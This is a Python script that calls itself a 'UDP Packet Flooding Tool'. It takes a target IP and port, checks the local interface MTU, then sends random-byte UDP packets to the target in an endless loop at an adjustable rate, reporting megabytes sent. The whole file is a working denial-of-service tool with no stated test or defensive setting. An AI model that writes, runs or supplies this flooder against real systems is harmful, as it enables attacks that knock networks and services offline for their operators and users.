import socket
import random
import time
import argparse
import psutil

def get_max_packet_size(interface_name):
    net_if_addrs = psutil.net_if_stats()
    
    if interface_name in net_if_addrs:
        mtu = net_if_addrs[interface_name].mtu
        return mtu
    else:
        return None

def get_interface_used_by_socket(remote_host="8.8.8.8", remote_port=80):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((remote_host, remote_port))
        
        local_ip = sock.getsockname()[0]
        
        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.address == local_ip:
                    return interface, local_ip
    finally:
        sock.close()
        

parser = argparse.ArgumentParser(description="UDP Packet Flooding Tool")
parser.add_argument("ip", help="Target IP address")
parser.add_argument("port", type=int, help="Target port number")
parser.add_argument("-s", "--size", type=int, default=1024, help="Size of each packet (default: 1024 bytes)")
parser.add_argument("-r", "--rate", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
args = parser.parse_args()

ip = args.ip
port = args.port
packet_size = args.size
rate_limit = args.rate

interface, local_ip = get_interface_used_by_socket()
max_packet_size = get_max_packet_size(interface)  

if packet_size > max_packet_size:
    print(f"Warning: Packet size {packet_size} exceeds MTU {max_packet_size}. This may cause fragmentation.")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet_data = random._urandom(packet_size)

start_time = time.time()
packet_count = 0

print(f"Starting packet flood on {ip}:{port} with {packet_size} byte packets.")

try:
    while True:
        s.sendto(packet_data, (ip, port))
        packet_count += 1
        
        if packet_count % 1000 == 0:
            elapsed_time = time.time() - start_time
            print(f"[{elapsed_time:.2f} sec] Sent {round((packet_count * packet_size) / 1048576)} MB to {ip}:{port}.")
        
        time.sleep(rate_limit)

except KeyboardInterrupt:
    print(f"\nFlood stopped. Sent {packet_count} packets in {time.time() - start_time:.2f} seconds.")
    
except Exception as e:
    print(f"Error: {e}")

finally:
    s.close()
